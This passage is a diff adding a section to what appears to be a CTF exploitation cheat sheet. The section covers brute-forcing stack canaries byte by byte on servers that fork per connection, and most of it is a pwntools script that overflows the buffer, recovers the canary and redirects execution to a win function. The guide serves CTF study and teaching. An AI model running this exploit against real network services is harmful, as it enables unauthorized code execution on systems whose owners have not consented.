@@ -11,6 +11,7 @@
 - [Struct Pointer Overwrite (Heap Menu Challenges)](#struct-pointer-overwrite-heap-menu-challenges)
 - [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
 - [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
+- [Stack Canary Byte-by-Byte Brute Force on Forking Servers](#stack-canary-byte-by-byte-brute-force-on-forking-servers-ctf101)
 - [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
 
 ---
@@ -238,6 +239,65 @@ p.sendline(payload)
 **When to use:** Any function that traverses a buffer with user-controlled step size and null-terminator-based stop condition.
 
 **Key insight:** Stride-based OOB reads leak one byte per iteration by controlling which offset lands on the target byte. With enough iterations, leak full canary + return address to defeat both stack canary and PIE.
+
+## Stack Canary Byte-by-Byte Brute Force on Forking Servers (CTF101)
+
+**Pattern:** Server calls `fork()` for each connection. The child process inherits the same canary value. Brute-force the canary one byte at a time — each wrong byte crashes the child, but the parent continues with the same canary.
+
+**Canary structure:** First byte is always `\x00` (prevents string function leaks). Remaining 7 bytes are random. Total: 8 bytes on x86-64, 4 on x86-32.
+
+**Exploitation:**
+```python
+from pwn import *
+
+OFFSET = 64  # bytes to canary (buffer size)
+HOST, PORT = "target", 1337
+
+def try_byte(known_canary, guess_byte):
+    """Send overflow with known canary bytes + one guess. No crash = correct byte."""
+    p = remote(HOST, PORT)
+    payload = b'A' * OFFSET + known_canary + bytes([guess_byte])
+    p.send(payload)
+    try:
+        resp = p.recv(timeout=1)
+        p.close()
+        return True   # No crash → byte is correct
+    except:
+        p.close()
+        return False  # Crash → wrong byte
+
+# Byte 0 is always \x00
+canary = b'\x00'
+
+# Brute-force bytes 1-7 (only 256 attempts per byte, 7*256 = 1792 total)
+for byte_pos in range(1, 8):
+    for guess in range(256):
+        if try_byte(canary, guess):
+            canary += bytes([guess])
+            print(f"Canary byte {byte_pos}: 0x{guess:02x}")
+            break
+    else:
+        print(f"Failed at byte {byte_pos}")
+        break
+
+print(f"Full canary: {canary.hex()}")
+
+# Now overflow with correct canary + ROP chain
+p = remote(HOST, PORT)
+payload = b'A' * OFFSET + canary + b'B' * 8 + p64(win_addr)
+p.sendline(payload)
+```
+
+**Prerequisites:**
+- Server must `fork()` per connection (canary stays constant across children)
+- Overflow must be controllable byte-by-byte (no all-at-once read)
+- Distinguishable crash vs success response (timeout, error message, or connection behavior)
+
+**Expected attempts:** 7 * 128 = 896 average (7 bytes * 128 average guesses per byte). Maximum 7 * 256 = 1792.
+
+**Key insight:** `fork()` preserves the canary across child processes. Brute-forcing 8 bytes sequentially (7 * 256 = 1792 attempts) is vastly more efficient than brute-forcing all 8 bytes simultaneously (2^56 attempts).
+
+---
 
 ## Global Buffer Overflow (CSV Injection)
 
